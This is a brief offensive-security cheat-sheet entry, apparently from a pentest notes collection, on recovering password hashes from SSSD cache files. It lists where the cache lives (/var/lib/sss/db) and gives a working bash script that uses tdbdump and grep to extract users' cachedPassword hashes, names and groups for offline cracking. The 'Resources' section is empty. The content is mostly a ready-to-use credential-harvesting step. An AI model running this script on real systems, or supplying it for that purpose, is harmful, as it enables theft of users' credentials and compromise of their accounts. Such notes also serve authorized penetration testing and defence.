## Obtain Hash from Cached file and crack
1. Discover cached file in /var/lib/sss/db
2. Extract hash from it
```
#!/bin/bash

database="<path to local ldb file>"

for users in `tdbdump $database | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1`
do
	name=`tdbdump $database | grep cachedPassword | grep $users | cut -d "=" -f 7 | cut -d "," -f 1`
	group=`tdbdump $database | grep cachedPassword | grep $users | cut -d "=" -f 13 | cut -d "," -f 1`
	hash="`tdbdump $database | grep cachedPassword | cut -f 2-4 -d '$' |cut -f 1 -d '\\' |sed 's/^/$/g'`"
	echo "$users : $group : $name : $hash"
done
```

## Resources
